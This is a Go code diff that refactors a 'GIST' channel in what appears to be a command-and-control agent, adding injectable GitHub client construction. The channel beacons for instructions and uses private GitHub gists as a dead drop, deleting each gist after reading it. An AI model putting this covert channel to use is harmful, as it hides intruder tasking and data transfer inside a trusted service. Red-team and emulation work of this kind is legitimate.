@@ -29,12 +29,36 @@ type GIST struct {
 	token string
 	username string
 	client *github.Client
+	clientGetter ClientGetter
+}
+
+type ClientGetter func(string) *github.Client
+
+type GistFunctionHandles struct {
+	clientGetter ClientGetter
+}
+
+func getGithubClient(token string) *github.Client {
+	ctx := context.Background()
+	ts := oauth2.StaticTokenSource(
+		&oauth2.Token{AccessToken: token},
+	)
+	tc := oauth2.NewClient(ctx, ts)
+	return github.NewClient(tc)
+}
+
+func GenerateGistContactHandler(funcHandles *GistFunctionHandles) *GIST {
+	return &GIST{
+		name: "GIST",
+		clientGetter: funcHandles.clientGetter,
+	}
 }
 
 func init() {
-	CommunicationChannels["GIST"] = &GIST{
-		name: "GIST",
+	gistFuncHandles := &GistFunctionHandles{
+		clientGetter: getGithubClient,
 	}
+	CommunicationChannels["GIST"] = GenerateGistContactHandler(gistFuncHandles)
 }
 
 //GetInstructions sends a beacon and returns instructions
@@ -209,7 +233,7 @@ func (g *GIST) createGist(gistName string, description string, data []byte) int 
 	files[github.GistFilename(gistName)] = file
 	public := false
 	gist := github.Gist{Description: &description, Public: &public, Files: files,}
-	_, resp, err := g.Client.Gists.Create(ctx, &gist)
+	_, resp, err := g.client.Gists.Create(ctx, &gist)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[!] Error creating GIST: %s", err.Error()))
 		return githubError
@@ -220,17 +244,17 @@ func (g *GIST) createGist(gistName string, description string, data []byte) int 
 func (g *GIST) getGists(gistType string, uniqueID string) []string {
 	ctx := context.Background()
 	var contents []string
-	gists, _, err := g.Client.Gists.List(ctx, g.username, nil)
+	gists, _, err := g.client.Gists.List(ctx, g.username, nil)
 	if err == nil {
 		for _, gist := range gists {
 			if !*gist.Public && (*gist.Description == getDescriptor(gistType, uniqueID)) {
-				fullGist, _, err := g.Client.Gists.Get(ctx, gist.GetID())
+				fullGist, _, err := g.client.Gists.Get(ctx, gist.GetID())
 				if err == nil {
 					for _, file := range fullGist.Files {
 						contents = append(contents, *file.Content)
 					}
 				}
-				g.Client.Gists.Delete(ctx, fullGist.GetID())
+				g.client.Gists.Delete(ctx, fullGist.GetID())
 			}
 		}
 	}
@@ -238,12 +262,7 @@ func (g *GIST) getGists(gistType string, uniqueID string) []string {
 }
 
 func (g *GIST) createNewClient() bool {
-	ctx := context.Background()
-	ts := oauth2.StaticTokenSource(
-		&oauth2.Token{AccessToken: g.token},
-	)
-	tc := oauth2.NewClient(ctx, ts)
-	client := github.NewClient(tc)
+	client := g.clientGetter(g.token)
 	if client != nil {
 		return false
 	}
